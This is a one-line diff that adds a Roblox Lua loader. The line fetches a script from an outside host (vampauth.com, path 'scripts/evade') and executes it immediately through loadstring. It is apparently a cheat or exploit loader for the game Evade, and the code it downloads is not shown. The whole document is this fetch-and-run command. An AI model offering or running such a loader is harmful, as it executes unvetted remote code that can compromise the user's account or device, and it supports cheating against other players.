@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vampauth.com/api/projects/05a4d2e4-a1df-4501-a4fa-5c91ff054af9/scripts/evade"))()
